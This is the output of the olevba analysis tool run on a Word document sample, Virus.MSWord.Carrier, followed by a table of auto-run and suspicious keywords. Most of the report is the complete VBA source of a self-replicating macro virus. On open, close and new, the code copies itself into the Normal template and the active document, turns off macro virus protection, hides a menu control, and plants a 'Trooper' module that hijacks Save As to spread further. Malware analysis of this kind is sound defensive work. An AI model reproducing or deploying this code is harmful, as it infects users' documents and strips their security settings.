olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Carrier
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Carrier - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Rem written by Lord Arz
Rem BEGINN TDIE
NormInstalled = False
ActInstalled = False

NormalTemplate.VBProject.VBComponents(1).Export ("c:\Normal.bas")
ActiveDocument.VBProject.VBComponents(1).Export ("c:\Document.bas")

NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)

If UCase(NI) = "REM WRITTEN BY LORD ARZ" Then NormInstalled = True
If UCase(AI) = "REM WRITTEN BY LORD ARZ" Then ActInstalled = True

If NormInstalled = True And ActIntalled = True Then GoTo PayLoad

If NormInstalled = True Then IW = "c:\Normal.bas" Else IW = "C:\Document.bas"
Open IW For Input As #1
VirCode = "Private Sub Document_Close()" & Chr(13)
Do
Line Input #1, SRCLine
Loop Until SRCLine = "Private Sub Document_Close()"
Do Until UCase(SRCLine) = "REM END TDIE"
Line Input #1, SRCLine
VirCode = VirCode & SRCLine & Chr(13)
Loop

VirCode = VirCode & "End Sub"

If NormInstalled = False Then
Lines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, VirCode
End If
If ActInstalled = False Then
Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, VirCode
End If
PayLoad:
Close
Kill "C:\Document.bas"
Kill "C:\Normal.bas"
End Sub

Private Sub Document_New()
Rem written by Lord Arz
Rem BEGINN TDIE
'TDIE   by Dark Lord and Lord Arz
'Please don't remove this Sing
NormInstalled = False
ActInstalled = False

NormalTemplate.VBProject.VBComponents(1).Export ("c:\Normal.bas")
ActiveDocument.VBProject.VBComponents(1).Export ("c:\Document.bas")

NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)

If UCase(NI) = "REM WRITTEN BY LORD ARZ" Then NormInstalled = True
If UCase(AI) = "REM WRITTEN BY LORD ARZ" Then ActInstalled = True

If NormInstalled = True And ActIntalled = True Then GoTo PayLoad

If NormInstalled = True Then IW = "c:\Normal.bas" Else IW = "C:\Document.bas"
Open IW For Input As #1
VirCode = "Private Sub Document_Close()" & Chr(13)
Do
Line Input #1, SRCLine
Loop Until SRCLine = "Private Sub Document_Close()"
Do Until UCase(SRCLine) = "REM END TDIE"
Line Input #1, SRCLine
VirCode = VirCode & SRCLine & Chr(13)
Loop

VirCode = VirCode & "End Sub"

If NormInstalled = False Then
Lines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, VirCode
End If
If ActInstalled = False Then
Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, VirCode
End If
PayLoad:
Close
Kill "C:\Document.bas"
Kill "C:\Normal.bas"
End Sub


Private Sub Document_Open()
Rem written by Lord Arz
Rem BEGINN TDIE
'TDIE   by Dark Lord and Lord Arz
'Please don't remove this Sing
Options.VirusProtection = False
Application.CommandBars("Tools").Controls(12).Controls(3).Visible = False
NormInstalled = False
ActInstalled = False

NormalTemplate.VBProject.VBComponents(1).Export ("c:\Normal.bas")
ActiveDocument.VBProject.VBComponents(1).Export ("c:\Document.bas")

NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)

If UCase(NI) = "REM WRITTEN BY LORD ARZ" Then NormInstalled = True
If UCase(AI) = "REM WRITTEN BY LORD ARZ" Then ActInstalled = True

If NormInstalled = True And ActIntalled = True Then GoTo PayLoad

If NormInstalled = True Then IW = "c:\Normal.bas" Else IW = "C:\Document.bas"
Open IW For Input As #1
VirCode = "Private Sub Document_Close()" & Chr(13)
Do
Line Input #1, SRCLine
Loop Until SRCLine = "Private Sub Document_Close()"
Do Until UCase(SRCLine) = "REM END TDIE"
Line Input #1, SRCLine
VirCode = VirCode & SRCLine & Chr(13)
Loop

VirCode = VirCode & "End Sub"

If NormInstalled = False Then
Lines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, VirCode
End If
If ActInstalled = False Then
Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, VirCode
End If
PayLoad:
Close
Kill "C:\Document.bas"
Kill "C:\Normal.bas"
On Error GoTo SetTrooper
If NormalTemplate.VBProject.VBComponents("Agent").Name = "Agent" Then Exit Sub
SetTrooper:
Open "Trooper.bas" For Output As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Agent" & Chr(34)
Print #1, "Sub AutoOpen()"
Print #1, "Options.VirusProdection=false"
Print #1, "For x = 1 To Word.Windows.Count"
Print #1, "Word.Windows.Item(x).Caption = " & Chr(34) & " Infected by the Carrier virus (a trooper has already landed)" & Chr(34)
Print #1, "Next x"
Print #1, "End Sub"
Print #1, "Sub FileSaveAs()"
Print #1, "Dialogs(wdDialogFileSaveAs).Show"
Print #1, "If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then ActiveDocument.SaveAs FileFormat:=wdFormatTemplate"
Print #1, "Application.OrganizerCopy Normaltemplate.FullName, ActiveDocument.FullName, Trooper, wdOrganizerObjectProjectItems"
Print #1, "ActiveDocument.Save"
Print #1, "End Sub"
Close #1
NormalTemplate.VBProject.VBComponents.Import ("Trooper.bas")
Kill "Trooper.bas"
Rem End TDIE
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

